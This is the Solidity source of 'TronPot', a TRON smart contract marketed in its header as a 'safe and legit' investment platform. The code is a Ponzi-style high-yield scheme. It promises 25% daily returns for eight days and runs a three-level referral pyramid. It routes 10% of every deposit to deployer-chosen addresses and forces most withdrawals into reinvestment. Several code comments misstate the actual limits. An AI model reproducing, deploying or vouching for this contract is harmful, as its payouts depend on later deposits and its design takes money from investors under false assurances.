//SourceUnit: tronpot.sol

/*
 *
 *   TronPot - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original TronPot team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.tronPot.club/                                  │
 *   │                                                                       │                                          |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko
 *   2) Send any TRX amount (50 TRX minimum) using our website invest button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 */





pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Investor {
        address addr;
		uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 reinvestWallet;
        address referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
    }
}

contract Ownable {
    address payable public  owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract Tron_Pot is Ownable {
    using SafeMath for uint256;          // 18% Total Refer Income
    uint256 public constant REFERENCE_LEVEL1_RATE = 100;    // 10% Level 1 Income
    uint256 public constant REFERENCE_LEVEL2_RATE = 50;     // 5% Level 2 Income
    uint256[3] public REFERRAL_PERCENTS = [100,50,30];     // 3% Level 3 Income
    uint256 public constant MINIMUM = 100e6;                // Root ID : 1000
    uint256 public constant PLAN_INTEREST = 250;            // 25% Daily Roi
    uint256 public constant PLAN_TERM = 8 days;             // 8 Days
    uint256 public constant CONTRACT_LIMIT = 800;           // 20% Unlocked for Withdrawal Daily

    uint256 public  contract_balance;
    uint256 private contract_checkpoint;
    uint256 public  totalusers;
    uint256 public  totalInvestments_;
    uint256 public  totalReinvestments_;

    // mapping(address => uint256) public address2UID;
    mapping(address => Objects.Investor) public uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onReinvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    address payable public add1;
    address payable public add2;
    address payable public add3;
    address payable public add4;
    address payable public add5;
    address payable public you;
    constructor(address payable _add1,address payable _add2,address payable _add3,address payable _add4,address payable  _add5) public {
        add1=_add1;
        add2=_add2;
        add3=_add3;
        add4=_add4;
        add5=_add5;
        you=msg.sender;
        owner=msg.sender;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getInvestorInfoByUID(address Address) public view returns (uint256,uint256, uint256, address, uint256, uint256, uint256, uint256, uint256, uint256[] memory) {
        
        Objects.Investor storage investor = uid2Investor[Address];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.reinvestWallet,
        investor.referrer,
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.planCount,
        investor.checkpoint,
        newDividends
        );
    }

    function getInvestmentPlanByUID(address Address ) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        
        Objects.Investor storage investor = uid2Investor[Address];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    // 
    
    
    function _addInvestor(address _addr,address referrer) private returns (uint256) {
        
		if (uid2Investor[_addr].referrer == address(0)) {
			if ((uid2Investor[referrer].planCount == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}
		}
    uid2Investor[_addr].referrer = referrer;
    
            address upline = uid2Investor[_addr].referrer;
			for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        uid2Investor[upline].level1RefCount = uid2Investor[upline].level1RefCount.add(1);
                    } else if (i == 1) {
                        uid2Investor[upline].level2RefCount = uid2Investor[upline].level2RefCount.add(1);
                        
                    } else if (i == 2) {
                        uid2Investor[upline].level3RefCount = uid2Investor[upline].level3RefCount.add(1);
                    }
					upline = uid2Investor[upline].referrer;
				} else break;
            }
		
    }

    function _invest(address _addr, address referrer, uint256 _amount) private returns (bool) {
        add1.transfer(msg.value.mul(1).div(100));
        add2.transfer(msg.value.mul(1).div(100));
        add3.transfer(msg.value.mul(1).div(100));
        add4.transfer(msg.value.mul(1).div(100));
        add5.transfer(msg.value.mul(2).div(100));
        you.transfer(msg.value.mul(4).div(100));
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        if(uid2Investor[_addr].planCount<1){
         _addInvestor(_addr,referrer);
            //new user
        }
        uint256 planCount = uid2Investor[_addr].planCount;
        Objects.Investor storage investor = uid2Investor[_addr];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;
        uid2Investor[_addr].checkpoint = block.timestamp;
        investor.planCount = investor.planCount.add(1);
        _calculateReferrerReward(_amount, msg.sender);

        totalInvestments_ = totalInvestments_.add(_amount);

        return true;
    }

    function _reinvestAll(address _addr, uint256 _amount) private returns (bool) {
        add1.transfer(_amount.mul(1).div(100));
        add2.transfer(_amount.mul(1).div(100));
        add3.transfer(_amount.mul(1).div(100));
        add4.transfer(_amount.mul(1).div(100));
        add5.transfer(_amount.mul(2).div(100));
        you.transfer(_amount.mul(4).div(100));
        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        // uint256 uid = address2UID[_addr];

        uint256 planCount = uid2Investor[_addr].planCount;
        Objects.Investor storage investor = uid2Investor[_addr];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        totalReinvestments_ = totalReinvestments_.add(_amount);

        return true;
    }

    function invest(address referrer) public payable {
        if (_invest(msg.sender, referrer, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }

    function withdraw() public {

        // uint256 uid = address2UID[msg.sender];
        // require(uid != 0, "Can not withdraw because no any investments");

        require(withdrawAllowance(), "Withdraw are not allowed between 0am to 4am UTC");

        //only once a day
		require(block.timestamp > uid2Investor[msg.sender].checkpoint + 12 hours , "Twice a day");
        uid2Investor[msg.sender].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[msg.sender].planCount; i++) {
            if (uid2Investor[msg.sender].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[msg.sender].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[msg.sender].plans[i].investment , 
            PLAN_INTEREST , withdrawalDate , uid2Investor[msg.sender].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[msg.sender].plans[i].isExpired = isExpired;
            uid2Investor[msg.sender].plans[i].currentDividends += amount;
        }

         //
         if (uid2Investor[msg.sender].availableReferrerEarnings>0) {
             uint256 re=uid2Investor[msg.sender].availableReferrerEarnings.div(2);
            withdrawalAmount += uid2Investor[msg.sender].availableReferrerEarnings.div(2);
            uid2Investor[msg.sender].referrerEarnings = re.add(uid2Investor[msg.sender].referrerEarnings);
            uid2Investor[msg.sender].availableReferrerEarnings = re;
        }
         //

        if(withdrawalAmount>0){
            uint256 currentBalance = getBalance();
            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }
            require( currentBalance.sub(withdrawalAmount)  >= contract_balance.mul(CONTRACT_LIMIT).div(1000), "80% contract balance limit");
            require(withdrawalAmount>=50 trx,"you should have 50 trx");
            uint256 reinvestAmount = withdrawalAmount.mul(80).div(100);
            if(withdrawalAmount > 90e9 ){
                reinvestAmount = withdrawalAmount.sub(45e9);
            }
            //reinvest
            uid2Investor[msg.sender].reinvestWallet = uid2Investor[msg.sender].reinvestWallet.add(reinvestAmount);
            //withdraw
            msg.sender.transfer(withdrawalAmount.sub(reinvestAmount));
        }

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function reinvest() public {

        //only once a day
		require(block.timestamp > uid2Investor[msg.sender].checkpoint + 12 hours , "Only once a day");
        uid2Investor[msg.sender].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[msg.sender].planCount; i++) {
            if (uid2Investor[msg.sender].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[msg.sender].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[msg.sender].plans[i].investment , PLAN_INTEREST , 
            withdrawalDate , uid2Investor[msg.sender].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[msg.sender].plans[i].isExpired = isExpired;
            uid2Investor[msg.sender].plans[i].currentDividends += amount;
        }

        if (uid2Investor[msg.sender].availableReferrerEarnings>0) {
            withdrawalAmount += uid2Investor[msg.sender].availableReferrerEarnings;
            uid2Investor[msg.sender].referrerEarnings = uid2Investor[msg.sender].availableReferrerEarnings.add(uid2Investor[msg.sender].referrerEarnings);
            uid2Investor[msg.sender].availableReferrerEarnings = 0;
        }

        if (uid2Investor[msg.sender].reinvestWallet>0) {
            withdrawalAmount += uid2Investor[msg.sender].reinvestWallet;
            uid2Investor[msg.sender].reinvestWallet = 0;
        }


        if(withdrawalAmount>0){
            //reinvest
            _reinvestAll(msg.sender,withdrawalAmount);
        }

        emit onReinvest(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
    }
    
   function ReinvestableBalance(address _addr)public view returns(uint256){
       uint256 totalAmount;
       totalAmount=totalAmount.add(uid2Investor[_addr].reinvestWallet);
       totalAmount=totalAmount.add(uid2Investor[_addr].availableReferrerEarnings);
       return totalAmount;
   }
    function _calculateReferrerReward(uint256 _investment,address _addr) private {
      
            address upline = uid2Investor[_addr].referrer;
			for (uint256 i = 0; i < 3; i++) {
			    uint256 amount = _investment.mul(REFERRAL_PERCENTS[i]).div(1000);
                if (upline != address(0)) {
                    if (i == 0) {
					uid2Investor[upline].availableReferrerEarnings = uid2Investor[upline].availableReferrerEarnings.add(amount);
                    } else if (i == 1) {
                        
					uid2Investor[upline].availableReferrerEarnings = uid2Investor[upline].availableReferrerEarnings.add(amount);
                    } else if (i == 2) {
                        
					uid2Investor[upline].availableReferrerEarnings = uid2Investor[upline].availableReferrerEarnings.add(amount);
                    }
					upline = uid2Investor[upline].referrer;
				} else break;
            }
		

    }

    function updateBalance() public {
        //only once a day
		require(block.timestamp > contract_checkpoint + 1 days , "Only once a day");
        contract_checkpoint = block.timestamp;
        contract_balance = getBalance();
    
    }

    function getHour() public view returns (uint8){
        return uint8((block.timestamp / 60 / 60) % 24);
    }

    function withdrawAllowance() public view returns(bool){
        uint8 hour = getHour();
        if(hour >= 0 && hour <= 3){
            return false;
        }
        else{
            return true;
        }
    }
    
}